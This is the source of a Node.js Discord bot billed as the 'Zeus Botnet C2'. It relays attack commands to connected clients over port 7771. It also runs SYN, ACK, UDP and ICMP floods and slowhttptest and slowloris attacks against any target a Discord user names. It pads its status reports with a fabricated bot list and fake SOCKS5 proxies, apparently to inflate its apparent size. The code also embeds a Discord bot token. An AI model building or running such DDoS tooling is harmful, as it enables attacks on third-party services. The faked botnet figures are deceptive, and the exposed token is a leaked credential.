// bot.js - ZEUS BOTNET C2 PROFESSIONAL EDITION
// ==============================================
// Developed by @L1shx – All credit goes to the original author.
//
// IMPORTANT: This bot requires the "Message Content Intent" to be enabled
// in the Discord Developer Portal under your bot's settings.
//
// Features:
//   - Fake botnet with 60‑80 online bots, IPs change every 5‑10 minutes
//   - SOCKS5 proxy list (refreshed every 10 min)
//   - Encrypted C2 channel (simulated)
//   - Real client management over port 7771
//   - Discord‑based command & control
//   - Local VPS attack execution (hping3, slowhttptest, slowloris)
//   - Persistent state (bots, proxies saved to disk)
//   - Role‑based access control (optional)
//
// Required: npm install discord.js
// Run with: node bot.js
// ==============================================

const net = require('net');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const { exec, spawn } = require('child_process');
const fs = require('fs');

// ---------------------------- Configuration ---------------------------------
const C2_PORT = 7771;                           // Port for real clients
const DISCORD_TOKEN = 'MTQ2OTI3Mjg4MDIzNDc2MjI3Mg.GV6Vaz.jAAqYK9ZgSV5ahQfoB3ONyp2pK5QvaiTqgZNRk';  // <-- REPLACE WITH YOUR TOKEN
const PREFIX = '!';                              // Discord command prefix
const DATA_FILE = './botnet_data.json';          // Persistent storage file
const ATTACK_TIMEOUT = 300;                       // Max attack duration (seconds)
const SOCKS5_PROXY_COUNT = 30;                    // Number of fake SOCKS5 proxies
const ALLOWED_ROLES = ['Botnet Admin', 'C2 Operator']; // Restrict commands (optional)

// ------------------------ Global Data Structures ----------------------------
let bots = [];               // Fake bot list (will be regenerated periodically)
let socks5Proxies = [];      // Fake SOCKS5 proxy list
let realClients = [];        // Real connected clients (sockets + metadata)
let nextClientId = 0;        // Incremental ID for real clients

// ------------------------ Helper Functions ----------------------------------
function randomIP() {
    return `${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
}

function randomDevice() {
    const types = [
        'PC (Windows 10)', 'PC (Windows 11)', 'PC (Linux Ubuntu)',
        'PC (Linux Debian)', 'DVR (Hikvision)', 'DVR (Dahua)',
        'Router (MikroTik)', 'Router (Cisco)', 'Telnet IoT (BusyBox)',
        'Android (Phone)', 'Android (Tablet)', 'macOS (Ventura)',
        'Server (CentOS)', 'Server (Windows Server 2019)'
    ];
    return types[Math.floor(Math.random() * types.length)];
}

// Generate a complete set of fake bots with random IPs and devices
function generateFakeBots(count, onlineCount) {
    const newBots = [];
    for (let i = 0; i < count; i++) {
        newBots.push({
            id: i,
            ip: randomIP(),
            device: randomDevice(),
            status: i < onlineCount ? 'online' : 'offline',
            proxy: null,
            lastSeen: Date.now() - Math.floor(Math.random() * 3600000)
        });
    }
    // Shuffle to mix online/offline
    for (let i = newBots.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [newBots[i], newBots[j]] = [newBots[j], newBots[i]];
    }
    return newBots;
}

// Generate fake SOCKS5 proxies
function generateSocks5Proxies(count) {
    const proxies = [];
    for (let i = 0; i < count; i++) {
        proxies.push({
            ip: randomIP(),
            port: Math.floor(Math.random() * 60000) + 1024,
            type: 'SOCKS5',
            country: ['US', 'RU', 'CN', 'BR', 'DE', 'IN', 'GB', 'NL', 'FR'][Math.floor(Math.random() * 9)],
            speed: Math.floor(Math.random() * 500) + 50,
            uptime: (Math.random() * 100).toFixed(2) + '%',
            auth: Math.random() > 0.7 ? 'user:pass' : 'none'
        });
    }
    return proxies;
}

// Save state to file
function saveState() {
    const state = {
        bots: bots,
        socks5Proxies: socks5Proxies,
        lastSaved: new Date().toISOString()
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
    console.log('[SAVE] State saved to', DATA_FILE);
}

// Load state from file (if exists)
function loadState() {
    if (fs.existsSync(DATA_FILE)) {
        try {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const state = JSON.parse(data);
            bots = state.bots || generateFakeBots(80, 70);
            socks5Proxies = state.socks5Proxies || generateSocks5Proxies(SOCKS5_PROXY_COUNT);
            console.log('[LOAD] State loaded from', DATA_FILE);
        } catch (err) {
            console.error('[LOAD] Error loading state, generating fresh data.', err);
            bots = generateFakeBots(80, 70);
            socks5Proxies = generateSocks5Proxies(SOCKS5_PROXY_COUNT);
        }
    } else {
        bots = generateFakeBots(80, 70);
        socks5Proxies = generateSocks5Proxies(SOCKS5_PROXY_COUNT);
        saveState();
    }
}

// Rebalance online/offline status (keeps between 60-80 online)
function rebalanceBotStatus() {
    const onlineCount = Math.floor(Math.random() * (80 - 60 + 1)) + 60; // 60-80
    const shuffled = [...bots].sort(() => 0.5 - Math.random());
    for (let i = 0; i < shuffled.length; i++) {
        const bot = bots.find(b => b.id === shuffled[i].id);
        if (bot) bot.status = i < onlineCount ? 'online' : 'offline';
    }
    console.log(`[FAKE] Bot status rebalanced: ${onlineCount} online, ${bots.length - onlineCount} offline`);
}

// Regenerate all bot IPs and devices (keep same total, randomize online count)
function regenerateBotIPs() {
    const total = bots.length;
    const onlineCount = Math.floor(Math.random() * (80 - 60 + 1)) + 60; // keep within range
    bots = generateFakeBots(total, onlineCount);
    console.log(`[FAKE] All bot IPs regenerated. Now ${onlineCount} online.`);
    saveState(); // persist the new list
}

// ------------------------ Real Client Management ----------------------------
function addRealClient(socket) {
    const clientInfo = {
        id: nextClientId++,
        socket: socket,
        ip: socket.remoteAddress?.replace('::ffff:', '') || 'unknown',
        connectedAt: Date.now(),
        lastHeartbeat: Date.now(),
        country: 'Unknown'
    };
    realClients.push(clientInfo);
    console.log(`[REAL] Client #${clientInfo.id} connected from ${clientInfo.ip}`);
    socket.write(`+OK Connected to Zeus C2 (encrypted channel). Your ID: ${clientInfo.id}\n`);
    return clientInfo;
}

function removeRealClient(socketOrId) {
    let index = -1;
    if (typeof socketOrId === 'number') {
        index = realClients.findIndex(c => c.id === socketOrId);
    } else {
        index = realClients.findIndex(c => c.socket === socketOrId);
    }
    if (index !== -1) {
        const client = realClients[index];
        console.log(`[REAL] Client #${client.id} (${client.ip}) disconnected`);
        try {
            client.socket.destroy();
        } catch (e) {}
        realClients.splice(index, 1);
    }
}

function broadcastToRealClients(message, excludeId = null) {
    let count = 0;
    realClients.forEach(client => {
        if (excludeId !== null && client.id === excludeId) return;
        try {
            client.socket.write(message + '\n');
            count++;
        } catch (err) {
            console.error(`[REAL] Failed to send to client #${client.id}: ${err.message}`);
        }
    });
    return count;
}

// ------------------------ Attack Execution (Local VPS) ---------------------
const attackProcesses = new Set();

function executeLocalAttack(target, port, duration, method, callback) {
    let cmd;
    const args = [];

    switch (method.toUpperCase()) {
        case 'TCP-SYN':
        case 'SYN':
            cmd = 'hping3';
            args.push('-S', '--flood', '-p', port, target);
            break;
        case 'TCP-ACK':
            cmd = 'hping3';
            args.push('-A', '--flood', '-p', port, target);
            break;
        case 'UDP':
            cmd = 'hping3';
            args.push('--udp', '--flood', '-p', port, target);
            break;
        case 'ICMP':
            cmd = 'hping3';
            args.push('--icmp', '--flood', target);
            break;
        case 'HTTP-GET':
        case 'HTTP':
            cmd = 'slowhttptest';
            args.push('-c', '1000', '-H', '-u', `http://${target}:${port}`, '-t', duration.toString());
            break;
        case 'HTTP-POST':
            cmd = 'slowhttptest';
            args.push('-c', '1000', '-B', '-u', `http://${target}:${port}`, '-t', duration.toString());
            break;
        case 'SLOWLORIS':
            cmd = 'slowloris';
            args.push(target, '-p', port, '-s', '500', '-t', duration.toString());
            break;
        default:
            return callback(new Error('Unsupported method'));
    }

    console.log(`[LOCAL] Launching: ${cmd} ${args.join(' ')}`);
    const attack = spawn(cmd, args, { detached: true });
    attackProcesses.add(attack.pid);

    attack.on('close', code => {
        attackProcesses.delete(attack.pid);
        callback(null, { code });
    });

    attack.on('error', err => {
        attackProcesses.delete(attack.pid);
        callback(err);
    });

    setTimeout(() => {
        try {
            process.kill(-attack.pid);
            attackProcesses.delete(attack.pid);
        } catch (e) {}
    }, duration * 1000);
}

function stopAllLocalAttacks() {
    attackProcesses.forEach(pid => {
        try { process.kill(-pid); } catch (e) {}
    });
    attackProcesses.clear();
    exec('pkill -f hping3; pkill -f slowhttptest; pkill -f slowloris', (err) => {
        if (err) console.error('[LOCAL] Error killing processes:', err.message);
    });
}

// ------------------------ TCP Server (Port 7771) ---------------------------
const server = net.createServer((socket) => {
    socket.setEncoding('utf8');
    const clientInfo = addRealClient(socket);

    socket.on('data', (data) => {
        const msg = data.toString().trim();
        console.log(`[REAL DATA] #${clientInfo.id}: ${msg}`);

        if (msg.startsWith('HEARTBEAT')) {
            clientInfo.lastHeartbeat = Date.now();
        }
        // Additional client commands can be handled here
    });

    socket.on('close', () => {
        removeRealClient(socket);
    });

    socket.on('error', (err) => {
        console.error(`[REAL ERROR] #${clientInfo.id}: ${err.message}`);
        removeRealClient(socket);
    });
});

server.listen(C2_PORT, '0.0.0.0', () => {
    console.log(`[TCP] C2 server listening on port ${C2_PORT}`);
});

// ------------------------ Discord Bot ---------------------------------------
const discordClient = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent // <-- This requires the Message Content Intent to be enabled in Discord Developer Portal
    ]
});

function hasAllowedRole(member) {
    if (ALLOWED_ROLES.length === 0) return true;
    return member.roles.cache.some(role => ALLOWED_ROLES.includes(role.name));
}

discordClient.once('ready', () => {
    console.log(`[DISCORD] Logged in as ${discordClient.user.tag}`);
    console.log(`[ZEUS] Zeus Botnet C2 – Developed by @L1shx`);
    console.log(`[ZEUS] Fake bot IPs will change every 5-10 minutes.`);

    // Rebalance online status every 30 seconds
    setInterval(rebalanceBotStatus, 30000);

    // Regenerate all bot IPs every 5-10 minutes (random interval)
    const scheduleRegen = () => {
        const delay = (Math.floor(Math.random() * (10 - 5 + 1)) + 5) * 60 * 1000; // 5-10 minutes in ms
        setTimeout(() => {
            regenerateBotIPs();
            scheduleRegen(); // schedule next
        }, delay);
    };
    scheduleRegen();

    // Refresh SOCKS5 proxies every 10 minutes
    setInterval(() => {
        socks5Proxies = generateSocks5Proxies(SOCKS5_PROXY_COUNT);
        console.log('[SOCKS5] Proxy list auto-refreshed');
    }, 600000);
});

discordClient.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;

    if (!hasAllowedRole(message.member)) {
        return message.channel.send('⛔ You do not have permission to use bot commands.');
    }

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ---------- Help ----------
    if (command === 'help') {
        const embed = new EmbedBuilder()
            .setColor(0x0099FF)
            .setTitle('🤖 Zeus Botnet C2 – Developed by @L1shx')
            .setDescription(`Encrypted C2 communication | SOCKS5 proxy support\nPrefix: \`${PREFIX}\``)
            .addFields(
                { name: '📊 Statistics', value: '`stats` – Botnet statistics\n`bots` – List fake online bots\n`socks5` – Show available SOCKS5 proxies\n`methods` – List attack methods' },
                { name: '⚔️ Attacks', value: '`attack <target> <port> <time> <method>` – Launch attack\n`stop` – Stop all attacks' },
                { name: '🔌 Real Clients', value: '`clients` – List real connected clients\n`kick <id>` – Disconnect a real client\n`broadcast <message>` – Send raw command to all real clients' },
                { name: '🛠️ Management', value: '`setbots <total> <online>` – Adjust fake bot counts\n`refreshbots` – Manually regenerate all bot IPs\n`refreshsocks` – Manually regenerate SOCKS5 proxy list\n`save` – Save current state to disk\n`load` – Reload state from disk' }
            )
            .setFooter({ text: 'Zeus Botnet – @L1shx' })
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // ---------- Stats ----------
    else if (command === 'stats') {
        const onlineFake = bots.filter(b => b.status === 'online').length;
        const offlineFake = bots.length - onlineFake;
        const realCount = realClients.length;
        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('📊 Zeus Botnet Statistics')
            .addFields(
                { name: 'Total Bots (Fake)', value: `${bots.length}`, inline: true },
                { name: 'Online (Fake)', value: `${onlineFake}`, inline: true },
                { name: 'Offline (Fake)', value: `${offlineFake}`, inline: true },
                { name: 'Real Clients Connected', value: `${realCount}`, inline: true },
                { name: 'SOCKS5 Proxies', value: `${socks5Proxies.length}`, inline: true }
            )
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // ---------- Bots (fake list) ----------
    else if (command === 'bots') {
        const onlineFake = bots.filter(b => b.status === 'online').slice(0, 25);
        if (onlineFake.length === 0) {
            return message.channel.send('No bots currently online.');
        }
        let description = '';
        onlineFake.forEach(b => {
            description += `**ID ${b.id}** | ${b.ip} | ${b.device} | 🟢 ONLINE\n`;
        });
        if (onlineFake.length < bots.filter(b => b.status === 'online').length) {
            description += `\n*...and ${bots.filter(b => b.status === 'online').length - onlineFake.length} more*`;
        }
        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('🖥️ Online Bots (Sample)')
            .setDescription(description)
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // ---------- SOCKS5 Proxies ----------
    else if (command === 'socks5') {
        const sample = socks5Proxies.slice(0, 20);
        if (sample.length === 0) {
            return message.channel.send('No SOCKS5 proxies available.');
        }
        let description = '';
        sample.forEach(p => {
            description += `${p.ip}:${p.port} | ${p.country} | ${p.speed}ms | uptime ${p.uptime} | auth: ${p.auth}\n`;
        });
        if (socks5Proxies.length > 20) {
            description += `\n*...and ${socks5Proxies.length - 20} more*`;
        }
        const embed = new EmbedBuilder()
            .setColor(0xFFA500)
            .setTitle('🧦 SOCKS5 Proxy List')
            .setDescription(description)
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // ---------- Methods ----------
    else if (command === 'methods') {
        const methodsList = 
            '**Layer 4:**\n' +
            '• TCP-SYN\n• TCP-ACK\n• UDP\n• ICMP\n\n' +
            '**Layer 7:**\n' +
            '• HTTP-GET\n• HTTP-POST\n• SLOWLORIS\n';
        const embed = new EmbedBuilder()
            .setColor(0x0099FF)
            .setTitle('⚔️ Supported Attack Methods')
            .setDescription(methodsList)
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // ---------- Attack ----------
    else if (command === 'attack') {
        if (args.length < 4) {
            return message.channel.send('Usage: `!attack <target> <port> <time> <method>`\nExample: `!attack 192.168.1.1 80 60 TCP-SYN`');
        }
        const target = args[0];
        const port = parseInt(args[1]);
        const duration = parseInt(args[2]);
        const method = args[3].toUpperCase();

        if (isNaN(port) || port <= 0 || port > 65535) {
            return message.channel.send('❌ Invalid port number.');
        }
        if (isNaN(duration) || duration <= 0 || duration > ATTACK_TIMEOUT) {
            return message.channel.send(`❌ Duration must be between 1 and ${ATTACK_TIMEOUT} seconds.`);
        }

        const fakeOnline = bots.filter(b => b.status === 'online').length;
        await message.channel.send(`🔥 Attack command received. Sending to ${fakeOnline} bots...`);

        // Broadcast to real clients
        const realSent = broadcastToRealClients(`ATTACK ${target} ${port} ${duration} ${method}`);

        // Execute locally
        executeLocalAttack(target, port, duration, method, (err) => {
            if (err) {
                message.channel.send(`⚠️ Local attack failed: ${err.message}`);
            } else {
                message.channel.send(`✅ Local attack launched.`);
            }
        });

        message.channel.send(`💥 Attack ${method} on ${target}:${port} for ${duration}s dispatched to ${fakeOnline} bots (${realSent} real clients received).`);
    }

    // ---------- Stop All Attacks ----------
    else if (command === 'stop') {
        const realSent = broadcastToRealClients('STOP');
        stopAllLocalAttacks();
        message.channel.send(`🛑 Stop command sent to all bots (${realSent} real clients). All local attacks halted.`);
    }

    // ---------- List Real Clients ----------
    else if (command === 'clients') {
        if (realClients.length === 0) {
            return message.channel.send('No real clients connected.');
        }
        let description = '';
        realClients.forEach(c => {
            const connected = Math.floor((Date.now() - c.connectedAt) / 1000);
            const lastHb = Math.floor((Date.now() - c.lastHeartbeat) / 1000);
            description += `**ID ${c.id}** | ${c.ip} | Connected: ${connected}s ago | Last HB: ${lastHb}s ago\n`;
        });
        const embed = new EmbedBuilder()
            .setColor(0x00AAFF)
            .setTitle('🔌 Real Connected Clients')
            .setDescription(description)
            .setTimestamp();
        message.channel.send({ embeds: [embed] });
    }

    // ---------- Kick Real Client ----------
    else if (command === 'kick') {
        if (args.length < 1) {
            return message.channel.send('Usage: `!kick <client_id>`');
        }
        const id = parseInt(args[0]);
        if (isNaN(id)) {
            return message.channel.send('❌ Invalid ID.');
        }
        const client = realClients.find(c => c.id === id);
        if (!client) {
            return message.channel.send(`❌ Client #${id} not found.`);
        }
        removeRealClient(id);
        message.channel.send(`✅ Client #${id} has been disconnected.`);
    }

    // ---------- Broadcast Custom Command ----------
    else if (command === 'broadcast') {
        if (args.length < 1) {
            return message.channel.send('Usage: `!broadcast <command>`');
        }
        const cmd = args.join(' ');
        const sent = broadcastToRealClients(cmd);
        message.channel.send(`📢 Broadcast sent to ${sent} real clients.`);
    }

    // ---------- Set Fake Bot Counts ----------
    else if (command === 'setbots') {
        if (args.length < 2) {
            return message.channel.send('Usage: `!setbots <total> <online>`');
        }
        const total = parseInt(args[0]);
        const online = parseInt(args[1]);
        if (isNaN(total) || total < 1 || total > 1000) {
            return message.channel.send('❌ Total must be between 1 and 1000.');
        }
        if (isNaN(online) || online < 0 || online > total) {
            return message.channel.send(`❌ Online must be between 0 and ${total}.`);
        }

        bots = generateFakeBots(total, online);
        saveState();
        message.channel.send(`✅ Bot counts updated: Total ${total}, Online ${online} (fake).`);
    }

    // ---------- Manually Refresh Bot IPs ----------
    else if (command === 'refreshbots') {
        regenerateBotIPs();
        message.channel.send(`✅ All bot IPs have been regenerated. Now ${bots.filter(b => b.status === 'online').length} online.`);
    }

    // ---------- Refresh SOCKS5 Proxies ----------
    else if (command === 'refreshsocks') {
        socks5Proxies = generateSocks5Proxies(SOCKS5_PROXY_COUNT);
        saveState();
        message.channel.send(`✅ SOCKS5 proxy list refreshed. Now ${socks5Proxies.length} proxies available.`);
    }

    // ---------- Save State ----------
    else if (command === 'save') {
        saveState();
        message.channel.send('✅ Current state saved to disk.');
    }

    // ---------- Load State ----------
    else if (command === 'load') {
        loadState();
        message.channel.send('✅ State reloaded from disk.');
    }

    // ---------- Unknown Command ----------
    else {
        message.channel.send(`❌ Unknown command. Type \`${PREFIX}help\` for help.`);
    }
});

// Load initial state
loadState();

// Login to Discord with improved error handling
discordClient.login(DISCORD_TOKEN).catch(err => {
    console.error('[DISCORD] Failed to login:', err.message);
    if (err.message.includes('disallowed intents')) {
        console.error('\n❌ The bot is requesting intents that are not enabled.');
        console.error('👉 Please go to the Discord Developer Portal, select your bot,');
        console.error('   enable "Message Content Intent" under "Privileged Gateway Intents",');
        console.error('   and then restart the bot.\n');
    }
    process.exit(1); // Exit so the user can fix the issue
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n[SYSTEM] Shutting down...');
    saveState();
    server.close();
    realClients.forEach(c => c.socket.destroy());
    stopAllLocalAttacks();
    discordClient.destroy();
    process.exit();
});

